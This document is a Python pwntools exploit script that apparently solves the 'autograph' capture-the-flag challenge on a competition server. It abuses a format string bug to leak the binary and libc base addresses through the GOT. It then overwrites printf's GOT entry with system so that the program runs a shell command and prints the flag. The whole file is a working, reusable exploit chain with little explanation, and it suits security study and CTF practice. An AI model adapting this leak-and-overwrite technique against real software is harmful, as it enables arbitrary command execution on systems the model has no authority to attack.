#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('autograph')

host = args.HOST or 'cybergon2023.webhop.me'
port = int(args.PORT or 5001)
#  context.log_level = "DEBUG"

if args.REMOTE:
    # Found and downloaded via libc-database:
    #   ubuntu-glibc (libc6_2.35-0ubuntu3_amd64)
    libc = ELF('./libc.so.6')
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break main
break *(debug_notes+83)
continue
'''.format(**locals())


def do_printf(io, fmt_str):
    io.sendline(b"9") # Debug Notes
    if len(fmt_str) > 255:
        raise BaseError("Too long of format string")

    io.sendline(fmt_str)
    io.recvuntil(b"You Notes:\n")
    leak = io.recvuntil(b"What are you").split(b"\n")
    leak = leak[0]
    return leak

def leaks(io):
    exe.address = int(do_printf(io, b"%39$08p").decode(), 16) - 0x13e2
    print("Base address: " + hex(exe.address))

    print("Find GOT __libc_start_main via:", hex(exe.got['__libc_start_main']))
    if args.LOCAL:
        # +1 gets us around a null byte that will cause it to not print. Dunno
        # why remote doesn't need this.
        leak_addr = exe.got['__libc_start_main']+1
        prefix = b"\x00"
    else:
        leak_addr = exe.got['__libc_start_main']
        prefix = b""

    print("  leak target:", hex(leak_addr))
    fmt = (b"%10$s").ljust(32, b'.')
    fmt += p64(leak_addr)
    leak = do_printf(io, fmt)
    libc_start_main = u64(prefix + leak.split(b".")[0] + b"\x00\x00")
    print("  __libc_start_main", hex(libc_start_main))

    libc.address = libc_start_main - libc.symbols['__libc_start_main']
    print("Libc Base:", hex(libc.address))

    print("Finding GOT puts via:", hex(exe.got['puts']))
    print("  leak target:", hex(leak_addr))
    leak_addr = exe.got['puts']
    fmt = (b"%10$s").ljust(32, b'.')
    fmt += p64(leak_addr)
    leak = do_printf(io, fmt)
    puts = u64(leak.split(b".")[0] + b"\x00\x00")
    print("  puts", hex(puts))

    print("Find libc version using the following command with libc-database:")
    print(f"$ ./find __libc_start_main {hex(libc_start_main)} puts {hex(puts)}")

def do_exploit():
    io = start()
    io.recvuntil(b"Enter choice: ")

    # Leak program and libc base. Also leaks PLT but only needed for version
    # identification.
    leaks(io)

    # overwrite got printf with system so when we do debug we can give shell
    # command
    payload = fmtstr_payload(6, {exe.got['printf'] : libc.sym['system']})
    do_printf(io, payload)
    io.sendline(b"9")
    io.sendline(b"cat flag.txt")
    io.recvuntil(b"You Notes:")
    data = io.recvuntil(b"What are you").decode()
    flag = data.split("\n")[1]
    print("Flag: ", flag)

do_exploit()
